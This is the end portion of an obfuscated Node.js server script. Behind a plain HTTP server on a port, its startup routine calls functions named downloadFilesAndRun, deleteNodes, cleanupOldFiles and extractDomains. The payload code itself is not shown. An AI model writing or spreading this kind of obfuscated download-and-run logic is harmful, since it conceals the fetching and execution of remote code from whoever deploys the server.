console[_0x315b9c(0x1e2)](_0x315b9c(0x196)+_0x55761f[_0x315b9c(0x1f5)]),null;}}async function startserver(){const _0x27264f=_0x4a1cbb;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3572b5){console[_0x27264f(0x1e2)]('Error\x20in\x20startserver:',_0x3572b5);}}startserver()['catch'](_0xa59ffd=>{const _0x4be32e=_0x4a1cbb;console['error'](_0x4be32e(0x16a),_0xa59ffd);}),app[_0x4a1cbb(0x1dc)](PORT,()=>console[_0x4a1cbb(0x20e)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
